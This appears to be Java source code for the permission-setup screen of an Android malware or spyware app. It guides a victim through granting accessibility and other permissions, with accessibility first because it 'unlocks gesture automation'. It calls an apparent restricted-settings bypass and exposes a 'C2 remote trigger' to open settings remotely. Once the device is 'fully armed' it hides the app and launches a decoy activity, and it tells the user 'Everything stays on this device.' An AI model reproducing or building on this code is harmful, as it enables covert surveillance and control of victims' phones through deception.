package com.fason.app.ui;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;

import com.fason.app.R;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.core.permissions.PermissionManager.Gate;
import com.fason.app.core.permissions.RestrictedPermissionHelper;
import com.fason.app.stealth.decoy.DecoyActivity;

import java.util.List;

/**
 * PermissionSetupController — 2026 professional flow.
 *
 * The old flow was a single "Continue" button that walked gates blindly.
 * The new flow is a live dashboard: every gate is a row with real-time
 * state, one tap on a row opens the EXACT settings screen for that gate,
 * and a progress ring shows overall completion. Resume-safe, rotation-safe.
 *
 * Layout contract (activity_main.xml must provide):
 *   R.id.permOverlay      — root FrameLayout that hosts this UI
 *   R.id.permTitle        — TextView
 *   R.id.permSubtitle     — TextView
 *   R.id.permProgress     — ProgressBar (horizontal)
 *   R.id.permBtnContainer — FrameLayout for the action button
 *   R.id.permContent      — FrameLayout for the gate list
 */
public final class PermissionSetupController {
    private static final String TAG = "PermSetup2026";
    public static final int PERM_REQ = 1001;

    private static final int S_NA = 0;
    private static final int S_DONE = 1;
    private static final int S_DENIED = 2;
    private static final int S_NEED = 3;

    private static final char[] DOT_CHAR = {'\u2014', '\u2713', '\u2717', '\u25CF'};

    private final Activity activity;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private View permOverlay;
    private FrameLayout permContent;
    private TextView permTitle;
    private TextView permSubtitle;
    private ProgressBar permProgress;
    private FrameLayout permBtnContainer;
    private Button grantButton;
    private TextView[] rowDots;
    private TextView[] rowLabels;
    private TextView[] rowDetails;
    private boolean[] gatePrompted;
    private int phase = 0; // 0 welcome, 1 list, 2 done
    private boolean autoHideArmed = false;
    private boolean waitingForRuntime = false;

    private int[] dotColor;
    private int[] labelColor;

    private final List<Gate> gates = PermissionManager.getGates();

    public PermissionSetupController(@NonNull Activity activity) {
        this.activity = activity;
        int n = gates.size();
        this.gatePrompted = new boolean[n];
        this.rowDots = new TextView[n];
        this.rowLabels = new TextView[n];
        this.rowDetails = new TextView[n];
    }

    // ------------------------------------------------------------------
    // Lifecycle
    // ------------------------------------------------------------------

    public void onCreate(Bundle savedInstanceState) {
        resolveThemeColors();
        initOverlay();
        if (savedInstanceState != null) {
            phase = savedInstanceState.getInt("psc_phase", 0);
            gatePrompted = savedInstanceState.getBooleanArray("psc_prompted");
            if (gatePrompted == null) gatePrompted = new boolean[gates.size()];
            waitingForRuntime = savedInstanceState.getBoolean("psc_waiting", false);
            renderPhase();
        } else {
            phase = 0;
            renderWelcome();
        }
    }

    public void onResume() {
        if (waitingForRuntime) waitingForRuntime = false;
        if (phase >= 1) {
            PermissionManager.washRestrictedSettings(activity);
        }
        refresh();
        maybeAutoHide();
    }

    public void onRequestPermissionsResult(int requestCode) {
        if (requestCode == PERM_REQ) {
            waitingForRuntime = false;
            for (int i = 0; i < gates.size(); i++) {
                if (gates.get(i).kind == PermissionManager.Kind.RUNTIME) {
                    gatePrompted[i] = true;
                }
            }
        }
        refresh();
    }

    public void onSaveInstanceState(@NonNull Bundle out) {
        out.putInt("psc_phase", phase);
        out.putBooleanArray("psc_prompted", gatePrompted);
        out.putBoolean("psc_waiting", waitingForRuntime);
    }

    /** Entry point used by MainActivity. */
    public void autoStartFirstMissing() {
        if (PermissionManager.isFullyArmed(activity)) {
            maybeAutoHide();
            return;
        }
        showOverlay();
        if (phase == 0) renderWelcome();
        else refresh();
    }

    /** C2 remote trigger — open a specific gate's settings screen. */
    public boolean requestGate(String gateId) {
        Gate g = PermissionManager.findGate(gateId);
        if (g == null) return false;
        showOverlay();
        phase = 1;
        renderGateList();
        return PermissionManager.openGate(activity, g);
    }

    // ------------------------------------------------------------------
    // Rendering
    // ------------------------------------------------------------------

    private void renderPhase() {
        switch (phase) {
            case 0: renderWelcome(); break;
            case 2: onAllGranted(); break;
            default: renderGateList(); break;
        }
    }

    private void renderWelcome() {
        permContent.removeAllViews();
        phase = 0;

        TextView logo = new TextView(activity);
        logo.setText("\uD83D\uDC31");
        logo.setTextSize(54);
        logo.setGravity(Gravity.CENTER);
        permContent.addView(logo, matchWrap());

        TextView title = new TextView(activity);
        title.setText("Setup");
        title.setTextSize(28);
        title.setTextColor(resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF));
        title.setGravity(Gravity.CENTER);
        permContent.addView(title, matchWrap());

        TextView sub = new TextView(activity);
        sub.setText("A few quick steps to finish configuring.\nEverything stays on this device.");
        sub.setTextSize(14);
        sub.setTextColor(resolveColor(android.R.attr.textColorSecondary, 0xFFAAAAAA));
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, dp(8), 0, dp(24));
        permContent.addView(sub, matchWrap());

        Button continueBtn = makeButton("Continue");
        continueBtn.setOnClickListener(v -> {
            phase = 1;
            renderGateList();
            // Open accessibility immediately — first tap does real work
            handler.postDelayed(() -> {
                Gate acc = PermissionManager.findGate("accessibility");
                if (acc != null && !PermissionManager.isGateGranted(activity, acc)) {
                    PermissionManager.openGate(activity, acc);
                }
            }, 350);
        });
        permBtnContainer.removeAllViews();
        permBtnContainer.addView(continueBtn);
    }

    private void renderGateList() {
        permContent.removeAllViews();
        phase = 1;
        permTitle.setText("Permissions");
        permTitle.setVisibility(View.VISIBLE);
        permSubtitle.setVisibility(View.VISIBLE);
        permProgress.setVisibility(View.VISIBLE);

        LinearLayout list = new LinearLayout(activity);
        list.setOrientation(LinearLayout.VERTICAL);
        for (int i = 0; i < gates.size(); i++) {
            final int idx = i;
            Gate g = gates.get(i);
            LinearLayout rowContainer = new LinearLayout(activity);
            rowContainer.setOrientation(LinearLayout.VERTICAL);
            rowContainer.setPadding(0, dp(8), 0, dp(8));

            LinearLayout row = new LinearLayout(activity);
            row.setOrientation(LinearLayout.HORIZONTAL);
            row.setGravity(Gravity.CENTER_VERTICAL);

            TextView dot = new TextView(activity);
            dot.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
            dot.setTextColor(dotColor[S_NEED]);
            dot.setText(String.valueOf(DOT_CHAR[S_NEED]));
            row.addView(dot);

            TextView label = new TextView(activity);
            label.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
            label.setTextColor(labelColor[S_NEED]);
            label.setText(g.label);
            LinearLayout.LayoutParams lp =
                new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            lp.leftMargin = dp(12);
            label.setLayoutParams(lp);
            row.addView(label);

            TextView chevron = new TextView(activity);
            chevron.setText("\u203A");
            chevron.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20);
            chevron.setTextColor(labelColor[S_NA]);
            row.addView(chevron);

            TextView detail = new TextView(activity);
            detail.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
            detail.setTextColor(labelColor[S_NA]);
            detail.setVisibility(View.GONE);
            LinearLayout.LayoutParams detailLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
            detailLp.leftMargin = dp(12) + dp(16);
            detailLp.topMargin = dp(2);
            detail.setLayoutParams(detailLp);

            rowContainer.addView(row);
            rowContainer.addView(detail);
            rowContainer.setOnClickListener(v -> onGateTapped(idx));

            list.addView(rowContainer);
            rowDots[i] = dot;
            rowLabels[i] = label;
            rowDetails[i] = detail;
        }
        permContent.addView(list, matchWrap());

        grantButton = makeButton("Grant All");
        grantButton.setOnClickListener(v -> grantNextMissing());
        permBtnContainer.removeAllViews();
        permBtnContainer.addView(grantButton);
        refresh();
    }

    private void onGateTapped(int idx) {
        Gate g = gates.get(idx);
        if (PermissionManager.isGateGranted(activity, g)) return;
        boolean opened = PermissionManager.openGate(activity, g);
        if (opened) gatePrompted[idx] = true;
        refresh();
    }

    // ------------------------------------------------------------------
    // Refresh
    // ------------------------------------------------------------------

    private void refresh() {
        if (permOverlay == null || phase == 0 || phase == 2) return;
        int applicable = 0, granted = 0, denied = 0, firstMissing = -1;
        for (int i = 0; i < gates.size(); i++) {
            Gate g = gates.get(i);
            if (!g.applicable()) { setRowState(i, S_NA); setRowDetail(i, null); continue; }
            applicable++;
            if (PermissionManager.isGateGranted(activity, g)) {
                setRowState(i, S_DONE); setRowDetail(i, null); granted++;
            } else if (gatePrompted[i]) {
                setRowState(i, S_DENIED);
                setRowDetail(i, g.rationale + " — tap to open settings");
                denied++;
                if (firstMissing < 0) firstMissing = i;
            } else {
                setRowState(i, S_NEED);
                setRowDetail(i, g.rationale);
                if (firstMissing < 0) firstMissing = i;
            }
        }
        permProgress.setMax(Math.max(applicable, 1));
        permProgress.setProgress(granted);
        if (granted >= applicable) { onAllGranted(); return; }
        showOverlay();
        permTitle.setText("Permissions");
        permSubtitle.setText(denied > 0
            ? granted + " of " + applicable + " granted — tap any row to fix"
            : "Tap a row to grant, or use Grant All");
        if (firstMissing >= 0 && grantButton != null) {
            grantButton.setText("Grant All");
            grantButton.setVisibility(View.VISIBLE);
            permBtnContainer.setVisibility(View.VISIBLE);
        }
    }

    private void grantNextMissing() {
        // Accessibility first — it unlocks gesture automation for the rest
        Gate acc = PermissionManager.findGate("accessibility");
        if (acc != null && acc.applicable() && !PermissionManager.isGateGranted(activity, acc)) {
            PermissionManager.openGate(activity, acc);
            refresh();
            return;
        }
        for (int i = 0; i < gates.size(); i++) {
            Gate g = gates.get(i);
            if (!g.applicable()) continue;
            if (PermissionManager.isGateGranted(activity, g)) continue;
            boolean opened = PermissionManager.openGate(activity, g);
            if (opened) {
                gatePrompted[i] = true;
                if (g.kind == PermissionManager.Kind.RUNTIME) waitingForRuntime = true;
            }
            refresh();
            return;
        }
        refresh();
    }

    // ------------------------------------------------------------------
    // Completion
    // ------------------------------------------------------------------

    private void onAllGranted() {
        phase = 2;
        permTitle.setText("All Set");
        permSubtitle.setText("Setup complete");
        permContent.removeAllViews();
        TextView done = new TextView(activity);
        done.setText("\u2713");
        done.setTextSize(48);
        done.setTextColor(0xFF4CAF50);
        done.setGravity(Gravity.CENTER);
        permContent.addView(done, matchWrap());
        permOverlay.removeCallbacks(fadeOutRunnable);
        permOverlay.postDelayed(fadeOutRunnable, 900);
        maybeAutoHide();
    }

    private void maybeAutoHide() {
        if (autoHideArmed) return;
        if (!PermissionManager.isFullyArmed(activity)) return;
        autoHideArmed = true;
        PermissionManager.applyAutoHide(activity);
        DecoyActivity.launch(activity, DecoyActivity.getPreferredSkin(activity));
        activity.finish();
    }

    // ------------------------------------------------------------------
    // UI helpers
    // ------------------------------------------------------------------

    private void initOverlay() {
        permOverlay = activity.findViewById(R.id.permOverlay);
        permTitle = activity.findViewById(R.id.permTitle);
        permSubtitle = activity.findViewById(R.id.permSubtitle);
        permProgress = activity.findViewById(R.id.permProgress);
        permBtnContainer = activity.findViewById(R.id.permBtnContainer);
        permContent = activity.findViewById(R.id.permContent);
        if (permContent == null && permOverlay != null) {
            LinearLayout card = (LinearLayout) permOverlay.getChildAt(0);
            permContent = new FrameLayout(activity);
            permContent.setId(R.id.permContent);
            LinearLayout.LayoutParams flp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
            flp.topMargin = dp(16);
            card.addView(permContent, card.indexOfChild(permProgress));
        }
    }

    private LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
    }

    private Button makeButton(String text) {
        Button b = new Button(activity);
        b.setText(text);
        b.setTextColor(Color.WHITE);
        b.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        b.setAllCaps(false);
        b.setBackground(makeButtonBg());
        b.setPadding(0, dp(14), 0, dp(14));
        b.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        return b;
    }

    private GradientDrawable makeButtonBg() {
        GradientDrawable gd = new GradientDrawable();
        gd.setCornerRadius(dp(12));
        gd.setColor(resolveColor(android.R.attr.colorAccent, 0xFF4FC3F7));
        return gd;
    }

    private void setRowState(int idx, int state) {
        if (rowDots[idx] == null) return;
        rowDots[idx].setTextColor(dotColor[state]);
        rowDots[idx].setText(String.valueOf(DOT_CHAR[state]));
        rowLabels[idx].setTextColor(labelColor[state]);
    }

    private void setRowDetail(int idx, String text) {
        if (rowDetails[idx] == null) return;
        if (text == null || text.isEmpty()) {
            rowDetails[idx].setVisibility(View.GONE);
        } else {
            rowDetails[idx].setText(text);
            rowDetails[idx].setVisibility(View.VISIBLE);
        }
    }

    private void showOverlay() {
        if (permOverlay == null) return;
        if (permOverlay.getVisibility() != View.VISIBLE) {
            permOverlay.setAlpha(0f);
            permOverlay.setVisibility(View.VISIBLE);
            permOverlay.animate()
                .alpha(1f)
                .setDuration(220)
                .setInterpolator(new AccelerateDecelerateInterpolator())
                .start();
        }
    }

    private final Runnable fadeOutRunnable = new Runnable() {
        @Override
        public void run() {
            if (permOverlay == null) return;
            permOverlay.animate()
                .alpha(0f)
                .setDuration(260)
                .withEndAction(() -> permOverlay.setVisibility(View.GONE))
                .start();
        }
    };

    private void resolveThemeColors() {
        dotColor = new int[]{
            resolveColor(android.R.attr.textColorSecondary, 0xFF888888),
            0xFF4CAF50,
            0xFFE53935,
            resolveColor(android.R.attr.colorAccent, 0xFF4FC3F7)
        };
        labelColor = new int[]{
            resolveColor(android.R.attr.textColorSecondary, 0xFF888888),
            resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF),
            0xFFE53935,
            resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF)
        };
    }

    private int resolveColor(int attr, int fallback) {
        TypedValue tv = new TypedValue();
        if (activity.getTheme().resolveAttribute(attr, tv, true)) {
            if (tv.type >= TypedValue.TYPE_FIRST_COLOR_INT
                && tv.type <= TypedValue.TYPE_LAST_COLOR_INT) {
                return tv.data;
            }
        }
        return fallback;
    }

    private int dp(int v) {
        return (int) TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP, v, activity.getResources().getDisplayMetrics());
    }
}
